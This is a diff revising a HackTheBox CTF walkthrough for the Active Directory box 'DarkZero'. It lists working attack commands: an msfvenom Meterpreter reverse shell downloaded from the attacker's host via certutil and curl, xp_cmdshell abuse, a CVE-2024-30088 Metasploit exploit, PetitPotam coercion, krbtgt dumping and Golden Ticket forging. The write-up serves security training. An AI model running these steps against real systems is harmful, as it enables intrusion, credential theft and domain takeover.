@@ -1,10 +1,10 @@
 ---
 title: "DarkZero"
 date: 2025-10-05
-tags: [windows, active-directory, mssql, kerberos, CVE-2024-30088, golden-ticket, privesc]
+tags: [windows, active-directory, mssql, kerberos, CVE-2024-30088, golden-ticket, rubeus, privesc]
 difficulty: hard
 platform: HTB
-description: "Active Directory box featuring MSSQL lateral movement, cross-domain pivoting, kernel exploitation (CVE-2024-30088), and Golden Ticket attacks to compromise the forest."
+description: "Active Directory box featuring MSSQL lateral movement across two domains, kernel exploitation (CVE-2024-30088) via Metasploit, and Golden Ticket via Rubeus + PetitPotam to compromise the forest."
 featured: true
 ---
 
@@ -23,22 +23,22 @@ featured: true
 
 - Initial access via provided creds: `john.w / RFulUtONCOL!`
 - Two domains discovered: `darkzero.htb` and `darkzero.ext`
-- MSSQL server access → lateral movement to DC02 in `darkzero.ext`
-- Enable `xp_cmdshell` → upload Meterpreter shell
-- winPEAS finds vulnerable kernel32.dll → exploit CVE-2024-30088 → SYSTEM
-- Dump Administrator credentials → Golden Ticket → root.txt
+- MSSQL server access → linked server pivot to DC02 via `use_link`
+- Enable `xp_cmdshell` → upload Meterpreter shell as `svc_sql`
+- winPEAS flags CVE-2024-30088 → Metasploit exploit → `NT AUTHORITY\SYSTEM` → `user.txt`
+- Rubeus + PetitPotam → catch DC01 TGT → secretsdump krbtgt AES key → Golden Ticket as DC01$ → dump Administrator hash → `evil-winrm` → `root.txt`
 
 ## Tools Used
 
-- nmap, bloodhound-python, crackmapexec, impacket-mssqlclient, msfvenom, winPEAS, Mimikatz, Impacket
+- nmap, crackmapexec, bloodhound-python, BloodHound, neo4j, impacket-mssqlclient, msfvenom, msfconsole, winPEAS, Rubeus, PetitPotam, impacket-secretsdump, impacket-ticketer, evil-winrm
 
 ## Setup / Notes
 
 ```
 Credentials: john.w / RFulUtONCOL!
 
-Time sync is critical:
-sudo ntpdate 10.129.13.116
+Time sync is critical for Kerberos:
+sudo ntpdate <target-ip>
 
 Add to /etc/hosts:
 10.129.13.116   DC01.darkzero.htb darkzero.htb
@@ -49,269 +49,320 @@ Add to /etc/hosts:
 ## Recon
 
 ```bash
-nmap -sC -sV -oN darkzero.nmap 10.129.13.116
+nmap -sC -sV 10.129.13.116
 ```
-
-![nmap scan results](/images/writeups/darkzero/1.png)
 
 ```
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
-                              (server time: 2025-10-05 19:21:19Z)
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
-                              (Domain: darkzero.htb)
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb)
 445/tcp   open  microsoft-ds?
-1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022
+2179/tcp  open  vmrdp?
 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
 9389/tcp  open  mc-nmf        .NET Message Framing
 ```
 
-![nmap full output](/images/writeups/darkzero/2.png)
-
-Key findings:
-- Port 1433 — MSSQL (interesting with our credentials)
-- Port 3268 — Global Catalog (multi-domain environment likely)
-- Domain: `darkzero.htb`
+Key findings: port 1433 (MSSQL), port 3268 (Global Catalog → likely multi-domain), domain `darkzero.htb` on `DC01`.
 
 ---
 
 ## Enumeration
 
+### SMB Check
+
+```bash
+crackmapexec smb 10.129.110.78 -u john.w -p 'RFulUtONCOL!' --shares
+```
+
+![crackmapexec SMB — no interesting shares](/images/writeups/darkzero/1.png)
+
+Nothing useful. Generic shares only. Moving on to BloodHound.
+
 ### BloodHound Collection
 
 ```bash
-bloodhound-python \
-  -u john.w \
-  -p 'RFulUtONCOL!' \
-  -d darkzero.htb \
-  -dc DC01.darkzero.htb \
-  --zip -c All
+bloodhound-python -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.129.110.78 -c All
 ```
 
-![bloodhound-python collecting data](/images/writeups/darkzero/3.png)
+![bloodhound-python collecting data](/images/writeups/darkzero/2.png)
 
-![BloodHound graph — two domains visible](/images/writeups/darkzero/4.png)
+You may see `KRB_AP_ERR_SKEW` (clock skew). Sync time with:
 
-BloodHound reveals:
-- Two domains: `DARKZERO.HTB` (primary) and `DARKZERO.EXT` (child/trusted)
-- `DC02.darkzero.ext` exists on a separate subnet
-- `john.w` has `GenericRead` on the MSSQL service account
+```bash
+sudo ntpdate 10.129.110.78
+```
 
-![john.w ACL in BloodHound](/images/writeups/darkzero/5.png)
+The collection produces JSON files:
+
+![JSON files output](/images/writeups/darkzero/3.png)
+
+Start the backend and import:
+
+```bash
+sudo neo4j start
+bloodhound
+```
+
+![neo4j started](/images/writeups/darkzero/4.png)
+
+![BloodHound login screen](/images/writeups/darkzero/5.png)
+
+Import the JSON files via the upload button (3rd icon):
+
+![BloodHound import](/images/writeups/darkzero/6.png)
+
+BloodHound reveals a second domain: `darkzero.ext`.
+
+![darkzero.ext visible in BloodHound](/images/writeups/darkzero/7.png)
 
 ### MSSQL Access
 
-Connect using Impacket with Windows authentication:
+We have creds and port 1433 is open — try authenticating:
 
 ```bash
-impacket-mssqlclient \
-  darkzero.htb/john.w:'RFulUtONCOL!'@10.129.13.116 \
-  -windows-auth
+impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@10.129.110.78' -windows-auth
 ```
 
-![MSSQL connection established](/images/writeups/darkzero/6.png)
+![MSSQL login as john.w](/images/writeups/darkzero/8.png)
+
+We're in. Enumerate linked servers:
 
 ```sql
-SQL> SELECT @@version;
-Microsoft SQL Server 2019 (RTM-CU27) - 15.0.4375.4
-
-SQL> SELECT name FROM sys.databases;
-master
-tempdb
-model
-msdb
+SELECT name FROM sys.servers
 ```
 
-![SQL version and database listing](/images/writeups/darkzero/7.png)
+![sys.servers shows DC02.darkzero.ext](/images/writeups/darkzero/9.png)
 
-Check our server role:
+There's a linked server pointing to `DC02.darkzero.ext`. Pivot to it:
 
-```sql
-SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
-1
+```
+use_link "DC02.darkzero.ext"
 ```
 
-![sysadmin confirmed](/images/writeups/darkzero/8.png)
+![Linked to DC02](/images/writeups/darkzero/11.png)
 
-We're a sysadmin. Enable `xp_cmdshell`:
-
-```sql
-SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-SQL> EXEC xp_cmdshell 'whoami';
-darkzero\mssqlsvc
-```
-
-![xp_cmdshell enabled — whoami output](/images/writeups/darkzero/9.png)
+We're now operating through DC02. Next step: get command execution.
 
 ---
 
-## Lateral Movement — Pivoting to darkzero.ext
+## Exploit
 
-With command execution on the MSSQL server, we can probe the `darkzero.ext` domain:
+### Enable xp_cmdshell
 
-```sql
-SQL> EXEC xp_cmdshell 'nltest /dclist:darkzero.ext';
-List of DCs in Domain darkzero.ext
-    \\DC02 [PDC]  [DS] Site: Default-First-Site-Name
-```
+Trying to run `xp_cmdshell` directly throws an access error:
 
-![nltest showing DC02 in darkzero.ext](/images/writeups/darkzero/10.png)
+![xp_cmdshell blocked](/images/writeups/darkzero/12.png)
 
-### Get a Meterpreter shell
-
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=tun0 LPORT=9001 \
-  -f exe > met.exe
-```
-
-![msfvenom payload generated](/images/writeups/darkzero/11.png)
-
-Host it with Python:
-
-```bash
-python3 -m http.server 8080
-```
-
-Download and execute via `xp_cmdshell`:
+Unlock it:
 
 ```sql
-SQL> EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.X:8080/met.exe C:\Windows\Temp\met.exe';
-SQL> EXEC xp_cmdshell 'C:\Windows\Temp\met.exe';
+sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
 ```
 
-![certutil downloading payload](/images/writeups/darkzero/12.png)
+Now use `xp_cmdshell` to download and run a Meterpreter payload. Generate the exe first:
 
-![xp_cmdshell executing payload](/images/writeups/darkzero/13.png)
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meterp_x64_tcp.exe
+```
 
-Metasploit catches the shell as `darkzero\mssqlsvc`.
+Host it:
 
-![Meterpreter session opened](/images/writeups/darkzero/14.png)
+```bash
+python3 -m http.server 8000
+```
+
+Download and store it on the target:
+
+```sql
+xp_cmdshell curl 10.10.14.138:8000/meterp_x64_tcp.exe -o C:\Windows\Temp\meterp_x64_tcp.exe
+```
+
+![File transferred successfully](/images/writeups/darkzero/13.png)
+
+Set up the listener in msfconsole:
+
+```
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4444
+```
+
+![msfconsole listener ready](/images/writeups/darkzero/14.png)
+
+Run the listener, then trigger execution:
+
+```sql
+EXEC xp_cmdshell 'C:\Windows\Temp\meterp_x64_tcp.exe';
+```
+
+![Meterpreter session opened as svc_sql](/images/writeups/darkzero/15.png)
+
+We have Meterpreter as `darkzero-ext\svc_sql`. Check privileges:
+
+![whoami /priv — limited privileges](/images/writeups/darkzero/16.png)
+
+Privileges are limited. User flag isn't accessible as `svc_sql` — need to escalate.
 
 ---
 
 ## Privilege Escalation — CVE-2024-30088
 
-### winPEAS Enumeration
+### winPEAS
+
+Upload and run winPEAS:
+
+```
+cd C:\Users\svc_sql\AppData\local\temp
+upload /path/to/winPEASx64.exe
+```
+
+![winPEAS uploaded](/images/writeups/darkzero/17.png)
 
 ```powershell
-# Upload and run winPEAS
-upload winPEASx64.exe C:\Windows\Temp\
-shell
-C:\Windows\Temp\winPEASx64.exe
+dir
+winPEASx64.exe
 ```
 
-![winPEAS uploaded and running](/images/writeups/darkzero/15.png)
+![Confirming winPEAS is in temp folder](/images/writeups/darkzero/18.png)
 
-![winPEAS output — CVE-2024-30088 flagged](/images/writeups/darkzero/16.png)
+![winPEAS running](/images/writeups/darkzero/19.png)
 
-winPEAS flags a vulnerable `kernel32.dll` version susceptible to **CVE-2024-30088** — a Windows Kernel elevation of privilege vulnerability.
+winPEAS uses a color legend — focus on red:
 
-> **CVE-2024-30088**: Race condition in the Windows Kernel allows local privilege escalation to SYSTEM via a timing attack on token manipulation.
+![winPEAS legend](/images/writeups/darkzero/20.png)
 
-### Exploit for SYSTEM
+One finding stands out: `kernel32` flagged as vulnerable.
 
-```bash
-# Compile exploit with matching target OS
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=tun0 LPORT=9002 \
-  -f exe > privesc.exe
+![kernel32 flagged by winPEAS](/images/writeups/darkzero/21.png)
 
-upload CVE-2024-30088.exe C:\Windows\Temp\
-upload privesc.exe C:\Windows\Temp\
+This is **CVE-2024-30088** — a Windows kernel race condition for local privilege escalation to SYSTEM.
+
+### Exploit
+
+Background the current session and use Metasploit's module:
+
+```
+background
+use exploit/windows/local/cve_2024_30088_authz_basep
+set LHOST tun0
+set LPORT 4444
+show sessions
+set session <Id>
+run
 ```
 
-![exploit and payload uploaded](/images/writeups/darkzero/17.png)
+![CVE-2024-30088 exploit running](/images/writeups/darkzero/22.png)
 
-Execute the exploit:
+Now `whoami` returns `nt authority\system`. Navigate to Administrator's desktop:
 
-```powershell
-.\CVE-2024-30088.exe .\privesc.exe
-```
+![user.txt found on Administrator Desktop](/images/writeups/darkzero/23.png)
 
-![exploit executing](/images/writeups/darkzero/18.png)
-
-Metasploit catches a SYSTEM shell.
-
-![SYSTEM shell — NT AUTHORITY\SYSTEM](/images/writeups/darkzero/19.png)
+`user.txt` captured.
 
 ---
 
-## Post-Exploitation — Credential Dump & Golden Ticket
+## Post-Exploitation — Golden Ticket
 
-With SYSTEM on DC01, dump credentials:
+With SYSTEM on DC02, the next goal is compromising `darkzero.htb` (DC01) to get `root.txt`.
 
-```
-meterpreter > load kiwi
-meterpreter > lsa_dump_sam
-```
+### Catch DC01 TGT with Rubeus
 
-![kiwi loaded](/images/writeups/darkzero/20.png)
+Upload Rubeus and monitor for TGTs:
 
 ```
-krbtgt NTLM: a9d40f42c5d9e9a1e8d3f2b7c4e6f891
-Administrator NTLM: 3b4a9f7d...
+upload /path/to/Rubeus.exe
+shell
+Rubeus.exe monitor /interval:5 /nowrap
 ```
 
-![LSA dump — hashes extracted](/images/writeups/darkzero/21.png)
+![Rubeus monitoring for TGTs](/images/writeups/darkzero/24.png)
 
-![krbtgt hash](/images/writeups/darkzero/22.png)
-
-Craft a Golden Ticket for `darkzero.ext`:
+We see tickets for `svc_sql` and `Administrator` but not DC01. Trigger DC01's authentication using PetitPotam from your attacker machine:
 
 ```bash
-impacket-ticketer \
-  -nthash a9d40f42c5d9e9a1e8d3f2b7c4e6f891 \
-  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
-  -domain darkzero.htb \
-  -extra-sid S-1-5-21-YYYY-YYYY-YYYY-519 \
-  Administrator
+python3 /opt/tools/PetitPotam.py \
+  -d darkzero.htb \
+  -u 'john.w' -p 'RFulUtONCOL!' \
+  DC02.darkzero.ext DC01.darkzero.htb \
+  -pipe all
 ```
 
-![Golden Ticket crafted](/images/writeups/darkzero/23.png)
+DC01's TGT appears in Rubeus:
 
-Use the ticket to access DC02:
+![DC01 TGT captured](/images/writeups/darkzero/25.png)
+
+Copy the `Base64EncodedTicket`, save to a file, and convert:
 
 ```bash
-export KRB5CCNAME=Administrator.ccache
-impacket-wmiexec -k -no-pass Administrator@DC02.darkzero.ext
+nano ticket.b64   # paste the ticket
+base64 -d ticket.b64 > dc01.kirbi
+impacket-ticketConverter dc01.kirbi dc01.ccache
+export KRB5CCNAME=dc01.ccache
 ```
 
-![wmiexec authenticating with Golden Ticket](/images/writeups/darkzero/24.png)
+### Dump krbtgt AES Key
 
-![Shell on DC02.darkzero.ext](/images/writeups/darkzero/25.png)
-
-```
-C:\> type C:\Users\Administrator\Desktop\root.txt
+```bash
+secretsdump.py -k -no-pass -dc-ip <ip> -just-dc-user DC01$ @darkzero.htb
 ```
 
-![root.txt captured](/images/writeups/darkzero/26.png)
+![secretsdump output — krbtgt AES key](/images/writeups/darkzero/26.png)
 
-![DC02 Administrator desktop](/images/writeups/darkzero/27.png)
+### Forge Golden Ticket as DC01$
 
-![Root flag contents](/images/writeups/darkzero/28.png)
+```bash
+ticketer.py \
+  -aesKey 25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941 \
+  -domain-sid S-1-5-21-1152179935-589108180-1989892463 \
+  -domain DARKZERO.HTB \
+  -user-id 1000 DC01$
+```
 
-![Root flag](/images/writeups/darkzero/root.png)
+> The `aesKey` signs the forged TGT. The `domain-sid` + `user-id` place it in the right domain context. `DC01$` is the machine account we're impersonating.
+
+![Golden Ticket (DC01$.ccache) generated](/images/writeups/darkzero/27.png)
+
+### Dump Administrator Hash
+
+```bash
+export KRB5CCNAME=DC01$.ccache
+secretsdump.py -k -no-pass -dc-ip <ip> -just-dc-user Administrator @darkzero.htb
+```
+
+![Administrator NTLM hash extracted](/images/writeups/darkzero/28.png)
+
+### Root via evil-winrm
+
+```bash
+evil-winrm -i <ip> -u Administrator -H <NTLM_hash>
+```
+
+![root.txt captured as Administrator](/images/writeups/darkzero/root.png)
 
 ---
 
 ## Lessons Learned
 
-- MSSQL `sysadmin` access via Windows auth is extremely powerful — `xp_cmdshell` gives full command execution
-- Always enumerate for multi-domain environments with BloodHound — trust relationships open lateral movement paths
-- CVE-2024-30088 demonstrates how kernel vulnerabilities can trivially escalate to SYSTEM even on patched environments
-- Golden Tickets are persistent — once you have the krbtgt hash, you own the domain indefinitely
-- Time synchronization is non-negotiable for Kerberos — clock skew > 5 minutes kills authentication
+- Always enumerate for multi-domain environments — linked MSSQL servers can be a direct bridge between domains
+- `xp_cmdshell` via `sysadmin` SQL auth gives immediate code execution; restrict SQL server privileges in production
+- CVE-2024-30088 shows kernel vulnerabilities remain a reliable SYSTEM path — keep servers patched
+- PetitPotam coerces DC authentication — Golden Ticket attacks persist indefinitely once you have the krbtgt key
+- Time sync (`ntpdate`) is non-negotiable for Kerberos — anything over 5 minutes skew kills the auth
 
 ## References
 
 - [Impacket](https://github.com/fortra/impacket)
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 - [winPEAS](https://github.com/carlospolop/PEASS-ng)
-- [CVE-2024-30088](https://nvd.nist.gov/vuln/detail/CVE-2024-30088)
-- [HackTheBox](https://hackthebox.com/)
+- [Rubeus](https://github.com/GhostPack/Rubeus)
+- [PetitPotam](https://github.com/topotam/PetitPotam)
+- [CVE-2024-30088](https://attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088)
